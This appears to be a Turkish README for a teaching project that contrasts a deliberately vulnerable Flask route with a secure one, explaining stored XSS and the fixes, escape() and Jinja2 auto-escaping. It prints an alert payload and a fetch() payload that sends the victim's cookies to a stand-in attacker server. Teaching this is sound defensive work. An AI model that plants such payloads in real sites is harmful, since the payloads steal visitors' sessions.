# 🐞 XSS (Cross-Site Scripting) Anatomisi ve Savunma Mimarisi

Bu doküman, projede uygulanan **Stored (Kalıcı) XSS** zafiyetinin nasıl çalıştığını, potansiyel etkilerini ve güvenli rotada (`/secure`) bu zafiyetin nasıl kapatıldığını teknik olarak açıklar.

## 1. XSS Nedir?
XSS (Cross-Site Scripting), saldırganların diğer kullanıcılar tarafından görüntülenen web sayfalarına kötü amaçlı istemci tabanlı betikler (genellikle JavaScript) enjekte etmesine olanak tanıyan bir güvenlik açığıdır. 

Projemizde **Stored (Kalıcı) XSS** simüle edilmiştir. Saldırganın zararlı kodu veritabanına kaydedilir ve o sayfayı ziyaret eden her kullanıcının tarayıcısında otomatik olarak çalışır.

## 2. Zafiyetli Senaryo (Vulnerable Route)
Zafiyetli rotada (`/vulnerable`), kullanıcılardan alınan notlar ve yazar isimleri hiçbir filtrelemeden geçirilmeden veritabanına kaydedilir ve ekrana basılırken ham haliyle işlenir.

### 💥 İstismar (Exploitation) Örneği
Saldırgan, "Not İçeriği" alanına normal bir metin yerine şu payload'u (zararlı kod bloğunu) girer:

```html
<script>alert('Sistem zafiyet barındırıyor! Oturum bilginiz: ' + document.cookie);</script>
```

Veya daha tehlikeli bir senaryoda, sayfaya giren kurbanların oturum çerezlerini sessizce kendi sunucusuna sızdırabilir:

```html
<script>fetch("[http://saldirgan-sunucu.com/stealer?cookie=](http://saldirgan-sunucu.com/stealer?cookie=)" + document.cookie);</script>
```

## 🔍 Neden Çalışır?
HTML yapısında veya Jinja2 şablonunda kullanıcıdan gelen veri render edilirken, tarayıcı bu veriyi bir "metin" olarak değil, çalıştırılabilir bir "kod bloğu" (HTML/JS) olarak yorumlar. Kod, sunucu tarafında değil, doğrudan kurbanın tarayıcısında (Client-Side) çalışır.

## 3. Güvenli Senaryo ve Savunma (Secure Route)
Güvenli rotada (/secure), XSS saldırılarını tamamen engellemek için Derinlemesine Savunma (Defense in Depth) prensipleri uygulanmıştır:

## 🛡️ 1. Veri Kaçırma (Input Escaping / Sanitization)
Kullanıcıdan alınan veriler veritabanına yazılmadan ve işleme alınmadan önce Flask'ın markupsafe kütüphanesindeki escape() fonksiyonu ile temizlenir.

```
from markupsafe import escape

# Kullanıcı girdisi HTML entity'lerine dönüştürülerek zararsız hale getirilir
clean_content = escape(request.form.get("content"))
clean_author = escape(request.form.get("author"))
```

Bu işlem, < ve > gibi tehlikeli karakterleri &lt; ve &gt; formatına dönüştürür. Böylece tarayıcı <script> etiketini çalıştırmaz, sadece ekranda metin olarak gösterir.

## 🛡️ 2. Şablon Motoru Güvenliği (Context-Aware Auto-Escaping)
Flask'ın varsayılan şablon motoru olan Jinja2, .html uzantılı dosyalarda otomatik kaçırma (auto-escaping) özelliğini destekler. Projemizin güvenli mimarisinde veriler ekrana basılırken {{ note.content }} şeklinde kullanılır ve asla | safe filtresi (ham HTML render izni) ile by-pass edilmez.

## 4. Etki ve Sonuç

-- Uygulanan bu iki katmanlı güvenlik yaklaşımı sayesinde:

-- Kurbanların oturum token'larının çalınması (Session Hijacking) güvence altına alınmıştır.

-- Sayfa üzerinden sahte yönlendirmeler yapılması (Phishing) engellenmiştir.

-- Web sayfasının bütünlüğünün ve görünümünün bozulması (Defacement) önlenmiştir.
